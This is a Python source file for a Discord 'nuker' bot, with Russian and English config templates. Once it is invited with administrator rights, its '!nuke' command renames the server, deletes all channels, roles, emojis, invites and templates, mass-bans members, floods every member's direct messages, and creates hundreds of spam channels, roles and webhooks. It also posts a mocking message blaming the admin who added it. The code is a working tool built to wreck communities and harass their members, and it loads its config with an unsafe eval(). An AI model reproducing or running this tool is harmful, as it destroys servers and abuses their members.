from sys import platform

config_example_rus = '''
{
    # Токен бота
    'BOT_TOKEN': 'ТОКЕН БОТА',

    # Префикс для команд бота
    'BOT_COMMAND_PREFIX': '!',

    # Имя для каналов крашера
    'CHANNELS_NAME': 'КРАШ СЕРВЕРА',

    # Текст для спама
    'SPAM_TEXT': '@everyone ВЫПОЛНЯЕТСЯ КРАШ СЕРВЕРА! :clown:',

    # Причина для бана
    'BAN_REASON': 'Просто так',

    # Новое имя для сервера
    'RENAME_SERVER_TO': 'СЕРВЕР КРАШНУТ🤡',

    # Новое имя для ролей
    'ROLES_NAME': 'КРАШ',

    # Спам участникам в ЛС
    'DM_SPAM': 'ВЫПОЛНЯЕТСЯ КРАШ СЕРВЕРА!',

    # Сообщение при запуске крашера
    'NUKER_START_MESSAGE': \'\'\'@everyone\nУважаемые участники данного сервера!\nК сожалению, админ или модератор этого сервера оказался :mammoth:ом, и добавил меня на сервер :clap:\nКраш сервера начнётся через 3 секунды! :clown:\'\'\',

    # Отправлять ли стартовое сообщение?
    'SHOW_START_MESSAGE': True,

    'NUKER_OPTIONS': {

        # Переименовывать сервер?
        'RENAME_GUILD': True,

        # Очистить сообщения?
        'PURGE': True,

        # Спамить участникам в ЛС?
        # Рекомендую отключить FLOOD_DM, если сервер большой.
        'FLOOD_DM': True,

        # Удалить все каналы, и создать новые?
        'CREATE_CHANNELS': True,

        # Пересоздать ли роли?
        'CDROLES': True,

        # Банить ли участников?
        'BAN_MEMBERS': True,

        # Удалять ли эмодзи?
        'DELETE_EMOJIS': True,

        # Удалять ли приглашения?
        'DELETE_INVITES': True,

        # Спамить ли на всех каналах?
        'TOTAL_SPAM': True,

        # Создавать ли много вебхуков?
        'CREATE_WEBHOOKS': True,

        # Спамить ли вебхуками?
        'SPAM_WEBHOOKS': True,

        # Удалять ли шаблоны?
        'DELETE_TEMPLATES': True

    },

    # Участники, которых не нужно банить.
    'BAN_EXCLUDES':
        [
            'friend#0001',
            'test#0002'
        ],

    # Имена для вебхуков
    'WEBHOOK_NAMES':
        [
            'spam-webhook',
            'friend',
            'test'
        ]
}
'''

config_example_en = '''
{
    # Token of bot
    'BOT_TOKEN': 'TOKEN',

    # Bot command prefix
    'BOT_COMMAND_PREFIX': '!',

    # New channels name
    'CHANNELS_NAME': 'SERVER CRASHED',

    # Spamming text
    'SPAM_TEXT': '@everyone THIS SERVER WAS CRASHING! :clown:',

    # Ban reason
    'BAN_REASON': 'No reason, LOL',

    # New server name
    'RENAME_SERVER_TO': 'CLOWNS 🤡',

    # Roles name
    'ROLES_NAME': 'CRASH',

    # Members DM spam text
    'DM_SPAM': 'DANGER! THIS SERVER WAS CRASHING!',

    # Message on start
    'NUKER_START_MESSAGE': \'\'\'@everyone\nMembers of this server!\nUnfortunately, the admin or moderator of this server turned out to be :mammoth:, and added me to the server :clap:\nThe server will be crashed in 3 seconds! :clown:\'\'\',

    # Do send start message?
    'SHOW_START_MESSAGE': True,

    'NUKER_OPTIONS': {

        # Rename this server?
        'RENAME_GUILD': True,

        # Clear messages?
        'PURGE': True,

        # Do spamming members to DM?
        # Set it to False, if server big.
        'FLOOD_DM': True,

        # Delete all channels and create new?
        'CREATE_CHANNELS': True,

        # Delete old roles and create new?
        'CDROLES': True,

        # Massban?
        'BAN_MEMBERS': True,

        # Delete all emojis from server?
        'DELETE_EMOJIS': True,

        # Delete all invites from server?
        'DELETE_INVITES': True,

        # Spam on all channels?
        'TOTAL_SPAM': True,

        # Create webhooks?
        'CREATE_WEBHOOKS': True,

        # Spam new webhooks?
        'SPAM_WEBHOOKS': True,

        # Delete server tempates?
        'DELETE_TEMPLATES': True

    },

    # Ban excludes.
    'BAN_EXCLUDES':
        [
            'friend#0001',
            'test#0002'
        ],

    # Names for new webhooks
    'WEBHOOK_NAMES':
        [
            'spam-webhook',
            'friend',
            'test'
        ]
}
'''

label = '''┏━┓ ┏┓  ┏┓
┃ ┗┓┃┃  ┃┃
┃┏┓┗┛┣┓┏┫┃┏┳━━┳━┓
┃┃┗┓ ┃┃┃┃┗┛┃ ━┫┏┛
┃┃ ┃ ┃┗┛┃┏┓┃ ━┫┃
┗┛ ┗━┻━━┻┛┗┻━━┻┛
'''

from os.path import (split as psplit, sep)

folder = psplit(__file__)[0] + sep

from colorama import Fore, Back, Style

# colors

if platform == 'win32':
    class exceptions:

        class InvalidModeException(Exception):
            pass


    def __fq_seq(color):
        return '\033[38;5;%dm' % color


    def __bg_seq(color):
        return '\033[48;5;%dm' % color


    reset_seq = '\033[0m'



    def ResetColor():
        return Fore.RESET + Back.RESET + Style.RESET_ALL


    def GetColor(color, mode='bg'):
        if mode == 'bg':
            color = __bg_seq(color)
        elif mode == 'fg':
            color = __fq_seq(color)
        else:
            raise exceptions.InvalidModeException(
                'Invalid mode. Select one of this: bg - Background, fg - Foreground'
            )

        return color


    def RainbowColorize_L(text, mode='bg', colors=[], splittener=''):

        letters = []

        if splittener != '':
            for letter in text.split(splittener):
                letters.append(letter)
        else:
            for letter in text:
                letters.append(letter)

        index = 0
        lindex = 0

        for x in letters:

            if index >= len(colors):
                index = 0

            color_ = colors[index]
            letters[lindex] = GetColor(color_, mode) + letters[lindex]

            index += 1
            lindex += 1

        letters[-1] = letters[-1] + ResetColor()

        return splittener.join(letters)

# colors (end)

from os import _exit, name, system

from os.path import isfile, split

if platform == 'win32':
    from ctypes import windll

from pyperclip import copy

from math import ceil

clear = lambda: system('cls' if name == 'nt' else 'clear')
clear()

from time import sleep

if platform != 'win32':
    while True:
        if split(__file__)[1] == 'nuker.py':
            print(
                f'{Fore.RED}[{Fore.WHITE}x{Fore.RED}] {Fore.YELLOW}Incorrect file name: nuker.py - is standard file name for configs. Rename this file.{Fore.WHITE}'
            )
            _exit(1)
        lang = input(
            f'{Fore.YELLOW}Выберите язык/Select language\n\n1 - Russian/Русский\n2 - English/Английский\n\n{Fore.RED}[{Fore.WHITE}>{Fore.RED}] {Fore.WHITE}'
        )

        if lang in ['1', '2']:
            lang = int(lang)
            break

        else:
            print(
                f'{Fore.RED}[{Fore.WHITE}!{Fore.RED}] {Fore.YELLOW}Неверное число/Incorrect number.\n'
            )
            sleep(2)
            clear()
else:
    from locale import windows_locale
    kernel = windll.kernel32
    locale = windows_locale[kernel.GetUserDefaultUILanguage()]

    if locale == 'ru_RU':
        lang = 1
    else:
        lang = 2

    if split(__file__)[1] == 'nuker.py':
        print(
            f'{Fore.RED}[{Fore.WHITE}x{Fore.RED}] {Fore.YELLOW}Неверное имя файла: nuker.py - стандартное имя для конфигов. Переименуйте этот файл.{Fore.WHITE}'
            if lang == 1 else
            f'{Fore.RED}[{Fore.WHITE}x{Fore.RED}] {Fore.YELLOW}Incorrect file name: nuker.py - is standard file name for configs. Rename this file.{Fore.WHITE}'
        )
        _exit(1)

    print(
        f'{Fore.RED}[{Fore.WHITE}i{Fore.RED}] {Fore.YELLOW}Locale-Detector: Установлен русский язык.\n'
        if lang == 1 else
        f'{Fore.RED}[{Fore.WHITE}i{Fore.RED}] {Fore.YELLOW}Locale-Detector: Set english language.\n'
    )

clear()

from random import choice

colors_palitre = [[160, 161, 162, 163, 164, 165, 171, 177, 183, 189, 195],
                  [93, 99, 105, 111, 117, 123, 122, 121, 120, 119, 118],
                  [21, 27, 33, 39, 45, 51, 50, 49, 48, 47, 46],
                  [46, 47, 48, 49, 50, 51, 45, 39, 33, 27, 21]]


def MESSAGE():
    if platform == 'win32':
        palitre = choice(colors_palitre)
        print(RainbowColorize_L(label, 'fg', palitre, '\n'))

    else:
        print(Fore.RED + label)


autosearch_errored = False

if isfile(folder + 'nuker.py'):
    try:
        config = open(folder + 'nuker.py', 'r', encoding='utf-8')
        data = eval(config.read())
        config.close()

        keys = list(data.keys())

        if 'BOT_TOKEN' not in keys:
            raise NameError('BOT_TOKEN не найден в конфиге' if lang ==
                            1 else 'BOT_TOKEN not found in config')
        if 'BOT_COMMAND_PREFIX' not in keys:
            raise NameError('BOT_COMMAND_PREFIX не найден в конфиге' if lang ==
                            1 else 'BOT_COMMAND_PREFIX not found in config')
        if 'CHANNELS_NAME' not in keys:
            raise NameError('CHANNELS_NAME не найден в конфиге' if lang ==
                            1 else 'CHANNELS_NAME not found in config')
        if 'SPAM_TEXT' not in keys:
            raise NameError('SPAM_TEXT не найден в конфиге' if lang ==
                            1 else 'SPAM_TEXT not found in config')
        if 'BAN_REASON' not in keys:
            raise NameError('BAN_REASON не найден в конфиге' if lang ==
                            1 else 'BAN_REASON not found in config')
        if 'RENAME_SERVER_TO' not in keys:
            raise NameError('RENAME_SERVER_TO не найден в конфиге' if lang ==
                            1 else 'RENAME_SERVER not found in config')
        if 'ROLES_NAME' not in keys:
            raise NameError('ROLES_NAME не найден в конфиге' if lang ==
                            1 else 'ROLES_NAME not found in config')
        if 'DM_SPAM' not in keys:
            raise NameError('DM_SPAM не найден в конфиге' if lang ==
                            1 else 'SM_SPAM not found in config')
        if 'NUKER_START_MESSAGE' not in keys:
            raise NameError(
                'NUKER_START_MESSAGE не найден в конфиге' if lang ==
                1 else 'NUKER_START_MESSAGE not found in config')
        if 'SHOW_START_MESSAGE' not in keys:
            raise NameError('SHOW_START_MESSAGE не найден в конфиге' if lang ==
                            1 else 'SHOW_START_MESSAGE not found in config')
        if 'BAN_EXCLUDES' not in keys:
            raise NameError('BAN_EXCLUDES не найден в конфиге' if lang ==
                            1 else 'BAN_EXCLUDES not found in config')
        if 'WEBHOOK_NAMES' not in keys:
            raise NameError('WEBHOOK_NAMES не найден в конфиге' if lang ==
                            1 else 'WEBHOOK_NAMES not found in config')
        if 'NUKER_OPTIONS' not in keys:
            raise NameError('NUKER_OPTIONS не найден в конфиге' if lang ==
                            1 else 'NUKER_OPTIONS not found in config')

        keys = list(data['NUKER_OPTIONS'].keys())

        if 'RENAME_GUILD' not in keys:
            raise NameError(
                'NUKER_OPTIONS|RENAME_GUILD не найден в конфиге' if lang ==
                1 else 'NUKER_OPTIONS|RENAME_GUILD not found in config')
        if 'PURGE' not in keys:
            raise NameError(
                'NUKER_OPTIONS|PURGE не найден в конфиге' if lang ==
                1 else 'NUKER_OPTIONS|PURGE not found in config')
        if 'FLOOD_DM' not in keys:
            raise NameError(
                'NUKER_OPTIONS|FLOOD_DM не найден в конфиге' if lang ==
                1 else 'NUKER_OPTIONS|FLOOD_DM not found in config')
        if 'CREATE_CHANNELS' not in keys:
            raise NameError(
                'NUKER_OPTIONS|SPAM_CHANNELS не найден в конфиге' if lang ==
                1 else 'NUKER_OPTIONS|CREATE_CHANNELS not found in config')
        if 'CDROLES' not in keys:
            raise NameError(
                'NUKER_OPTIONS|CDROLES не найден в конфиге' if lang ==
                1 else 'NUKER_OPTIONS|CD_ROLES not found in config')
        if 'BAN_MEMBERS' not in keys:
            raise NameError(
                'NUKER_OPTIONS|BAN_MEMBERS не найден в конфиге' if lang ==
                1 else 'NUKER_OPTIONS|BAN_MEMBERS not found in config')
        if 'DELETE_EMOJIS' not in keys:
            raise NameError(
                'NUKER_OPTIONS|DELETE_EMOJIS не найден в конфиге' if lang ==
                1 else 'NUKER_OPTIONS|DELETE_EMOJIS not found in config')
        if 'DELETE_INVITES' not in keys:
            raise NameError(
                'NUKER_OPTIONS|DELETE_INVITES не найден в конфиге' if lang ==
                1 else 'NUKER_OPTIONS|DELETE_INVITES not found in config')
        if 'TOTAL_SPAM' not in keys:
            raise NameError(
                'NUKER_OPTIONS|TOTAL_SPAM не найден в конфиге' if lang ==
                1 else 'NUKER_OPTIONS|TOTAL_SPAM not found in config')
        if 'CREATE_WEBHOOKS' not in keys:
            raise NameError(
                'NUKER_OPTIONS|CREATE_WEBHOOKS не найден в конфиге' if lang ==
                1 else 'NUKER_OPTIONS|CREATE_WEBHOOKS not found in config')
        if 'DELETE_TEMPLATES' not in keys:
            raise NameError(
                'NUKER_OPTIONS|DELETE_TEMPLATES не найден в конфиге' if lang ==
                1 else 'NUKER_OPTIONS|DELETE_TEMPLATES not found in config')
        is_found = True
    except Exception as e:
        autosearch_errored = True
        is_found = False
        print(
            f'{Fore.RED}[{Fore.WHITE}x{Fore.RED}] {Fore.YELLOW}Авто-обнаружение: Ошибка чтения конфига: {e}{Fore.WHITE}'
            if lang == 1 else
            f'{Fore.RED}[{Fore.WHITE}x{Fore.RED}] {Fore.YELLOW}Auto-Detect: Error reading config: {e}{Fore.WHITE}'
        )
        print(
            f'{Fore.RED}[{Fore.WHITE}i{Fore.RED}] {Fore.YELLOW}Укажите другой файл или исправьте ошибку в ./nuker.py'
            if lang == 1 else
            f'{Fore.RED}[{Fore.WHITE}i{Fore.RED}] {Fore.YELLOW}Insert other file or fix error in ./nuker.py'
        )
else:
    is_found = False

if not is_found and autosearch_errored:
    print('\n')
MESSAGE()

print(
    f'{Fore.RED}[{Fore.WHITE}i{Fore.RED}] {Fore.YELLOW}Если у вас нет файла с конфигом, введите название несуществующего файла.\n'
    if lang == 1 else
    f'{Fore.RED}[{Fore.WHITE}i{Fore.RED}] {Fore.YELLOW}If you dont have config file, enter incorrect file name.\n'
)

if is_found == False:
    while True:
        config = input(
            f'{Fore.YELLOW}Введите имя файла с конфигом {Fore.RED}[{Fore.WHITE}>{Fore.RED}] {Fore.WHITE}'
            if lang == 1 else
            f'{Fore.YELLOW}Enter config file name {Fore.RED}[{Fore.WHITE}>{Fore.RED}] {Fore.WHITE}'
        )

        if isfile(config):
            break
        else:
            print(
                f'{Fore.RED}[{Fore.WHITE}x{Fore.RED}] {Fore.YELLOW}Файл не найден!'
                if lang == 1 else
                f'{Fore.RED}[{Fore.WHITE}x{Fore.RED}] {Fore.YELLOW}File not found!'
            )

            while True:
                ask = input(
                    f'{Fore.YELLOW}Желаете ли вы создать файл с примером? (Y/N) {Fore.RED}[{Fore.WHITE}>{Fore.RED}] {Fore.WHITE}'
                    if lang == 1 else
                    f'{Fore.YELLOW}Do you want create a file with example? (Y/N) {Fore.RED}[{Fore.WHITE}>{Fore.RED}] {Fore.WHITE}'
                ).lower()
                if ask not in ('y', 'n'):
                    print(
                        f'{Fore.RED}[{Fore.WHITE}x{Fore.RED}] {Fore.YELLOW}Введите Y или N.'
                        if lang == 1 else
                        f'{Fore.RED}[{Fore.WHITE}x{Fore.RED}] {Fore.YELLOW}Input Y or N.'
                    )
                else:
                    if ask == 'n':
                        print(
                            f'{Fore.RED}[{Fore.WHITE}x{Fore.RED}] {Fore.YELLOW}Действие отменено.'
                            if lang == 1 else
                            f'{Fore.RED}[{Fore.WHITE}x{Fore.RED}] {Fore.YELLOW}Action cancelled.'
                        )
                        break
                    elif ask == 'y':
                        file = open(folder + 'nuker.py', 'w', encoding='utf-8')
                        file.write(config_example_rus if lang ==
                                   1 else config_example_en)
                        file.close()
                        print(
                            f'{Fore.RED}[{Fore.WHITE}x{Fore.RED}] {Fore.YELLOW}Файл создан в ./nuker.py, отредактируйте токен и запустите скрипт.{Fore.WHITE}'
                            if lang == 1 else
                            f'{Fore.RED}[{Fore.WHITE}x{Fore.RED}] {Fore.YELLOW}File created in ./nuker.py, insert token and restart script.{Fore.WHITE}'
                        )
                        _exit(0)

    try:
        config = open(config, 'r', encoding='utf-8')
        data = eval(config.read())
        config.close()

        keys = list(data.keys())

        if 'BOT_TOKEN' not in keys:
            raise NameError('BOT_TOKEN не найден в конфиге' if lang ==
                            1 else 'BOT_TOKEN not found in config')
        if 'BOT_COMMAND_PREFIX' not in keys:
            raise NameError('BOT_COMMAND_PREFIX не найден в конфиге' if lang ==
                            1 else 'BOT_COMMAND_PREFIX not found in config')
        if 'CHANNELS_NAME' not in keys:
            raise NameError('CHANNELS_NAME не найден в конфиге' if lang ==
                            1 else 'CHANNELS_NAME not found in config')
        if 'SPAM_TEXT' not in keys:
            raise NameError('SPAM_TEXT не найден в конфиге' if lang ==
                            1 else 'SPAM_TEXT not found in config')
        if 'BAN_REASON' not in keys:
            raise NameError('BAN_REASON не найден в конфиге' if lang ==
                            1 else 'BAN_REASON not found in config')
        if 'RENAME_SERVER_TO' not in keys:
            raise NameError('RENAME_SERVER_TO не найден в конфиге' if lang ==
                            1 else 'RENAME_SERVER not found in config')
        if 'ROLES_NAME' not in keys:
            raise NameError('ROLES_NAME не найден в конфиге' if lang ==
                            1 else 'ROLES_NAME not found in config')
        if 'DM_SPAM' not in keys:
            raise NameError('DM_SPAM не найден в конфиге' if lang ==
                            1 else 'SM_SPAM not found in config')
        if 'NUKER_START_MESSAGE' not in keys:
            raise NameError(
                'NUKER_START_MESSAGE не найден в конфиге' if lang ==
                1 else 'NUKER_START_MESSAGE not found in config')
        if 'SHOW_START_MESSAGE' not in keys:
            raise NameError('SHOW_START_MESSAGE не найден в конфиге' if lang ==
                            1 else 'SHOW_START_MESSAGE not found in config')
        if 'BAN_EXCLUDES' not in keys:
            raise NameError('BAN_EXCLUDES не найден в конфиге' if lang ==
                            1 else 'BAN_EXCLUDES not found in config')
        if 'WEBHOOK_NAMES' not in keys:
            raise NameError('WEBHOOK_NAMES не найден в конфиге' if lang ==
                            1 else 'WEBHOOK_NAMES not found in config')
        if 'NUKER_OPTIONS' not in keys:
            raise NameError('NUKER_OPTIONS не найден в конфиге' if lang ==
                            1 else 'NUKER_OPTIONS not found in config')

        keys = list(data['NUKER_OPTIONS'].keys())

        if 'RENAME_GUILD' not in keys:
            raise NameError(
                'NUKER_OPTIONS|RENAME_GUILD не найден в конфиге' if lang ==
                1 else 'NUKER_OPTIONS|RENAME_GUILD not found in config')
        if 'PURGE' not in keys:
            raise NameError(
                'NUKER_OPTIONS|PURGE не найден в конфиге' if lang ==
                1 else 'NUKER_OPTIONS|PURGE not found in config')
        if 'FLOOD_DM' not in keys:
            raise NameError(
                'NUKER_OPTIONS|FLOOD_DM не найден в конфиге' if lang ==
                1 else 'NUKER_OPTIONS|FLOOD_DM not found in config')
        if 'CREATE_CHANNELS' not in keys:
            raise NameError(
                'NUKER_OPTIONS|SPAM_CHANNELS не найден в конфиге' if lang ==
                1 else 'NUKER_OPTIONS|CREATE_CHANNELS not found in config')
        if 'CDROLES' not in keys:
            raise NameError(
                'NUKER_OPTIONS|CDROLES не найден в конфиге' if lang ==
                1 else 'NUKER_OPTIONS|CD_ROLES not found in config')
        if 'BAN_MEMBERS' not in keys:
            raise NameError(
                'NUKER_OPTIONS|BAN_MEMBERS не найден в конфиге' if lang ==
                1 else 'NUKER_OPTIONS|BAN_MEMBERS not found in config')
        if 'DELETE_EMOJIS' not in keys:
            raise NameError(
                'NUKER_OPTIONS|DELETE_EMOJIS не найден в конфиге' if lang ==
                1 else 'NUKER_OPTIONS|DELETE_EMOJIS not found in config')
        if 'DELETE_INVITES' not in keys:
            raise NameError(
                'NUKER_OPTIONS|DELETE_INVITES не найден в конфиге' if lang ==
                1 else 'NUKER_OPTIONS|DELETE_INVITES not found in config')
        if 'TOTAL_SPAM' not in keys:
            raise NameError(
                'NUKER_OPTIONS|TOTAL_SPAM не найден в конфиге' if lang ==
                1 else 'NUKER_OPTIONS|TOTAL_SPAM not found in config')
        if 'CREATE_WEBHOOKS' not in keys:
            raise NameError(
                'NUKER_OPTIONS|CREATE_WEBHOOKS не найден в конфиге' if lang ==
                1 else 'NUKER_OPTIONS|CREATE_WEBHOOKS not found in config')
        if 'DELETE_TEMPLATES' not in keys:
            raise NameError(
                'NUKER_OPTIONS|DELETE_TEMPLATES не найден в конфиге' if lang ==
                1 else 'NUKER_OPTIONS|DELETE_TEMPLATES not found in config')
    except Exception as e:
        print(
            f'{Fore.RED}[{Fore.WHITE}x{Fore.RED}] {Fore.YELLOW}Ошибка чтения конфига: {e}{Fore.WHITE}'
            if lang == 1 else
            f'{Fore.RED}[{Fore.WHITE}x{Fore.RED}] {Fore.YELLOW}Error reading config: {e}{Fore.WHITE}'
        )
        _exit(0)

from discord import Intents
from threading import Thread

from random import choice

from keyboard import is_pressed

clear()

MESSAGE()

print(Fore.YELLOW + 'Авторизация бота...' if lang ==
      1 else Fore.YELLOW + 'Logging in...')

import asyncio

if platform == 'win32':
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
else:
    asyncio.set_event_loop_policy(asyncio.DefaultEventLoopPolicy())

from discord.ext import commands

intents = Intents.all()
intents.members = True

client = commands.Bot(command_prefix=data['BOT_COMMAND_PREFIX'],
                      intents=intents)

created_webhooks = 0


async def CREATE_WEBHOOK(ctx, channel):
    try:
        WBNAME = choice(data['WEBHOOK_NAMES'])
        w = await channel.create_webhook(name=WBNAME)
        created_webhooks += 1
        print(Fore.RED +
              f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] Создан вебхук' if lang ==
              1 else Fore.RED +
              f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] Created webhook')
        if data['NUKER_OPTIONS']['SPAM_WEBHOOKS']:
            while True:
                try:
                    await w.send(data['SPAM_TEXT'])
                except:
                    await asyncio.sleep(2)
                    print(
                        Fore.RED +
                        f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] Спам вебхуками: Рейт-лимит'
                        if lang == 1 else Fore.RED +
                        f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] Webhook spam: Ratelimited'
                    )
    except:
        pass


async def CREATE_ROLE(ctx):
    try:
        await ctx.guild.create_role(name=data['ROLES_NAME'])
        print(f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] Создана роль' if lang ==
              1 else f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] Created role')
    except:
        pass


async def DELETE_OBJECT(OBJECT):
    try:
        await OBJECT.delete()
        print(
            f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] Удалено: {OBJECT}' if lang ==
            1 else f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] Deleted: {OBJECT}')
    except:
        print(
            f'{Fore.RED}[{Fore.WHITE}-{Fore.RED}] Не удалось удалить: {OBJECT}'
            if lang == 1 else
            f'{Fore.RED}[{Fore.WHITE}-{Fore.RED}] Failed to delete: {OBJECT}')


async def BAN(MEMBER):
    try:
        await MEMBER.ban(reason=data['BAN_REASON'])
        print(
            f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] Забанен: {MEMBER}' if lang ==
            1 else f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] Banned: {MEMBER}')
    except:
        print(
            f'{Fore.RED}[{Fore.WHITE}x{Fore.RED}] Не удалось забанить: {MEMBER}'
            if lang == 1 else
            f'{Fore.RED}[{Fore.WHITE}x{Fore.RED}] Failed to ban: {MEMBER}')


async def CM_DELETE_ROLES(ctx):
    try:
        for role in ctx.guild.roles:
            asyncio.create_task(DELETE_OBJECT(role))
    except:
        pass


async def CM_CREATE_ROLES(ctx):
    try:
        for x in range(250):
            asyncio.create_task(CREATE_ROLE(ctx))
        print(
            f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] Создано 250 задач по созданию ролей'
            if lang == 1 else
            f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] Started 250 tasks to create roles'
        )
    except:
        pass


async def NEW_CHANNEL(ctx):
    try:
        channel = await ctx.guild.create_text_channel(data['CHANNELS_NAME'])
        print(f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] Создан канал' if lang ==
              1 else f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] Created channel')

        if data['NUKER_OPTIONS']['CREATE_WEBHOOKS'] and created_webhooks < 50:
            asyncio.create_task(CREATE_WEBHOOK(ctx, channel))

        if data['NUKER_OPTIONS']['TOTAL_SPAM']:
            while True:
                await channel.send(data['SPAM_TEXT'])
    except:
        pass


async def CM_CDCHANNELS(ctx):
    try:
        for CHANNEL in ctx.guild.channels:
            asyncio.create_task(DELETE_OBJECT(CHANNEL))
        for x in range(250):
            asyncio.create_task(NEW_CHANNEL(ctx))
        print(
            f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] Создано 250 задач по созданию каналов'
            if lang == 1 else
            f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] Started 250 tasks to create channels'
        )
    except:
        raise


async def CM_MEMBER_BAN(ctx):
    for member in ctx.guild.members:
        if (member.name + "#" +
                str(member.discriminator)) not in data['BAN_EXCLUDES']:

            asyncio.create_task(BAN(member))


async def CM_RENAME_GUILD(ctx):
    await ctx.guild.edit(name=data['RENAME_SERVER_TO'])
    print(f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] Сервер переименован' if lang ==
          1 else f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] Server renamed')


async def DM_USER(ctx, member):
    try:
        while True:
            await member.send(data['DM_SPAM'])
    except:
        print(
            Fore.RED +
            f'{Fore.RED}[{Fore.WHITE}!{Fore.RED}] ОШИБКА: Не удалось запустить флуд в ЛС'
            if lang == 1 else
            f'{Fore.RED}[{Fore.WHITE}!{Fore.RED}] ERROR: Failed to spam DM')


async def CM_FLOOD_DM(ctx):
    for member in ctx.guild.members:
        asyncio.create_task(DM_USER(ctx, member))


async def CM_PURGE(ctx):
    try:
        await ctx.channel.purge(limit=None)
    except:
        pass


async def CM_DELETE_ALL_EMOJIS(ctx):
    for emoji in ctx.guild.emojis:
        asyncio.create_task(DELETE_OBJECT(emoji))


async def CM_DELETE_ALL_INVITES(ctx):
    for invite in await ctx.guild.invites():
        asyncio.create_task(DELETE_OBJECT(invite))
    print(
        Fore.RED +
        f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] Созданы задачи по удалению всех приглашений'
        if lang == 1 else
        f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] Created tasks to delete all invites'
    )


async def CM_CREATE_WEBHOOKS(ctx):
    if not data['NUKER_OPTIONS']['CREATE_CHANNELS']:
        for _ in range(ceil(50 / len(ctx.guild.channels))):
            for x in ctx.guild.channels:
                asyncio.create_task(CREATE_WEBHOOK(ctx, x))


async def CM_DELETE_TEMPLATES(ctx):
    for template in await ctx.guild.templates():
        asyncio.create_task(DELETE_OBJECT(template))


@client.command()
async def nuke(ctx):
    clear()

    await ctx.message.delete()

    if data['SHOW_START_MESSAGE']:
        await ctx.send(data['NUKER_START_MESSAGE'])
        await asyncio.sleep(3)

    if data['NUKER_OPTIONS']['RENAME_GUILD']:
        asyncio.create_task(CM_RENAME_GUILD(ctx))

    if data['NUKER_OPTIONS']['PURGE']:
        asyncio.create_task(CM_PURGE(ctx))

    if data['NUKER_OPTIONS']['FLOOD_DM']:
        asyncio.create_task(CM_FLOOD_DM(ctx))

    if data['NUKER_OPTIONS']['CREATE_CHANNELS']:
        asyncio.create_task(CM_CDCHANNELS(ctx))

    if data['NUKER_OPTIONS']['CDROLES']:
        asyncio.create_task(CM_DELETE_ROLES(ctx))
        asyncio.create_task(CM_CREATE_ROLES(ctx))

    if data['NUKER_OPTIONS']['BAN_MEMBERS']:
        asyncio.create_task(CM_MEMBER_BAN(ctx))

    if data['NUKER_OPTIONS']['DELETE_EMOJIS']:
        asyncio.create_task(CM_DELETE_ALL_EMOJIS(ctx))

    if data['NUKER_OPTIONS']['DELETE_INVITES']:
        asyncio.create_task(CM_DELETE_ALL_INVITES(ctx))

    if data['NUKER_OPTIONS']['CREATE_WEBHOOKS']:
        asyncio.create_task(CM_CREATE_WEBHOOKS(ctx))

    if data['NUKER_OPTIONS']['DELETE_TEMPLATES']:
        asyncio.create_task(CM_DELETE_TEMPLATES(ctx))


def KEYBOARD_LISTENER_F12():
    while True:
        if is_pressed('F12'):
            print(
                f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] {Fore.YELLOW}Программа остановлена{Fore.WHITE}'
                if lang == 1 else
                f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] {Fore.YELLOW}Program stopped{Fore.WHITE}'
            )
            _exit(0)

        sleep(.05)


def KEYBOARD_LISTENER_CTRL_U():
    while True:
        if is_pressed('Ctrl+U'):
            copy(
                f'https://discord.com/api/oauth2/authorize?client_id={client.user.id}&permissions=8&scope=bot'
            )

            if platform == 'win32':
                windll.user32.MessageBoxW(
                    0,
                    f'https://discord.com/api/oauth2/authorize?client_id={client.user.id}&permissions=8&scope=bot',
                    'Ссылка для приглашения скопирована'
                    if lang == 1 else 'Invite link copied', 0x40)

        sleep(.05)


@client.event
async def on_ready():

    clear()

    MESSAGE()

    Thread(target=lambda: KEYBOARD_LISTENER_F12()).start()

    Thread(target=lambda: KEYBOARD_LISTENER_CTRL_U()).start()

    if len(client.guilds) == 0:
        print(Fore.RED + f'Бот не приглашён ни на один сервер!\n' if lang ==
              1 else Fore.RED + f'Bot is not invited to any server!\n')
        print(
            Fore.RED +
            f'Пригласите бота на сервер, используя ссылку{Fore.GREEN}\nhttps://discord.com/api/oauth2/authorize?client_id={client.user.id}&permissions=8&scope=bot\n\n{Fore.RED}И запустите скрипт заново.'
            if lang == 1 else Fore.RED +
            f'Add bot to server, using invite link{Fore.GREEN}\nhttps://discord.com/api/oauth2/authorize?client_id={client.user.id}&permissions=8&scope=bot\n\n{Fore.RED}And run script again.'
        )
        input(Fore.YELLOW + f'\nENTER {Fore.RED}> Выйти ')
        print(Fore.WHITE)

        _exit(0)

    if is_found:
        print(
            f'{Fore.RED}[{Fore.WHITE}i{Fore.RED}] {Fore.YELLOW}Автоматическое обнаружение конфига: ./nuker.py\n'
            if lang == 1 else
            f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] {Fore.YELLOW}Config auto-detect: ./nuker.py\n'
        )

    print(f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] {Fore.YELLOW}F12: Остановить'
          if lang ==
          1 else f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] {Fore.YELLOW}F12: Stop')

    print(
        f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] {Fore.YELLOW}CTRL+U: Скопировать пригласительную ссылку\n'
        if lang == 1 else
